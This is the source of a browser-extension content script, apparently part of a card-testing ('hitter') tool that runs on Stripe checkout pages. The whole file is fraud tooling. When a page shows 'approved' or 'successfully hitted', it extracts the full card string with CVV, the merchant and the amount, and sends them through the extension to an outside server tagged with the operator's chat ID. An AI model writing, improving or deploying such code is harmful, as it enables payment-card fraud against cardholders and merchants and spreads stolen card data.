/**
 * Nexvora Notification System v2.0
 * Monitors both the Dashboard and Checkout Pages for successful hits.
 */

(async function() {
    const RENDER_URL = 'https://extensionshitteer.onrender.com';
    const startTime = Date.now(); // Smart Guard: Track extension start time
    
    // Get User Chat ID from storage
    const userChatId = await new Promise(resolve => {
        chrome.storage.local.get(['chatId'], (result) => {
            resolve(result.chatId || 'Unknown');
        });
    });

    let hasNotifiedSuccess = false; // Anti-duplicate flag for current page session

    /**
     * Tries to find the real merchant name on the checkout page.
     */
    const getMerchantName = () => {
        try {
            // 1. Try common Stripe merchant name selectors
            const selectors = [
                '.MerchantName',
                '.Header-merchantName',
                '.header-company-name',
                '[data-testid="merchant-name"]',
                '.p-ProductSummary-header'
            ];
            
            for (const selector of selectors) {
                const el = document.querySelector(selector);
                if (el && el.innerText.trim()) return el.innerText.trim();
            }

            // 2. Try to find the name next to the "Back" arrow (Common Pattern)
            const headerText = document.body.innerText.split('\n')[0];
            if (headerText && headerText.length < 50 && headerText.length > 2) return headerText.trim();

            // 3. Fallback to Referrer Hostname
            if (window.top !== window.self && document.referrer) {
                try {
                    return new URL(document.referrer).hostname;
                } catch(e) {}
            }
        } catch (e) {}
        return window.location.hostname;
    };

    /**
     * Dynamic extraction of amount with multi-currency support.
     */
    const getTransactionAmount = (nodeText) => {
        const currencyRegex = /(?:[A-Z]{2,3}|[\$£€¥])\s?[\d,]+(?:\.\d{2,3})?|[\d,]+(?:\.\d{2})?\s?(?:[A-Z]{2,3}|[\$£€¥])/gi;
        const match = nodeText.match(currencyRegex);
        if (match) return match[0].trim();
        const pageText = document.body.innerText;
        const pageMatch = pageText.match(currencyRegex);
        return pageMatch ? pageMatch[0].trim() : 'N/A';
    };

    const notifyServer = async (hitData) => {
        if (hasNotifiedSuccess) return; 
        
        try {
            hasNotifiedSuccess = true;
            console.info('🚀 Nexvora: Requesting background proxy for hit...', hitData);

            chrome.runtime.sendMessage({
                type: 'NOTIFY_HIT',
                data: {
                    card: hitData.card,
                    amount: hitData.amount,
                    gateway: hitData.gateway,
                    status: hitData.status,
                    user_chat_id: userChatId,
                    site_name: hitData.site_name
                }
            }, (response) => {
                console.log('Background Proxy status:', response);
            });
        } catch (error) {
            console.error('Failed to send notification via background:', error);
            hasNotifiedSuccess = false; 
        }
    };

    const processNewNode = (node) => {
        // Smart Guard 1: Ignore anything that happens in the first 3 seconds of load
        if (Date.now() - startTime < 3000) return;

        const text = node.innerText || node.textContent || '';
        if (!text || text.length < 5) return;

        const lowerText = text.toLowerCase();
        
        // Smart Guard 2: REMOVED broad keywords like "success"
        const successKeywords = ['paid successfully', 'successfully hitted', 'approved'];
        const isSuccess = successKeywords.some(kw => lowerText.includes(kw));

        // Ignore transient states
        const ignoreKeywords = ['processing', 'loading', 'wait', 'please', 'checking'];
        const shouldIgnore = ignoreKeywords.some(kw => lowerText.includes(kw));
        
        if (isSuccess && !shouldIgnore) {
            console.info('🚀 Nexvora: Hit Success detected. Extracting details...');
            
            const cardMatch = text.match(/\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}/);
            const card = cardMatch ? cardMatch[0] : 'N/A';

            const siteName = getMerchantName();
            const amount = getTransactionAmount(text);
            
            const hitData = {
                card: card,
                amount: amount,
                gateway: 'Stripe',
                status: 'Approved',
                site_name: siteName
            };

            notifyServer(hitData);
        }
    };

    const setupObserver = () => {
        const globalObserver = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                mutation.addedNodes.forEach((node) => {
                    if (node.nodeType === 1) processNewNode(node);
                });
            });
        });

        globalObserver.observe(document.body, { childList: true, subtree: true });
        console.log('🌍 Nexvora: Global Monitoring Active (with 3s Smart Guard).');
    };

    // Initialize
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', setupObserver);
    } else {
        setupObserver();
    }
})();
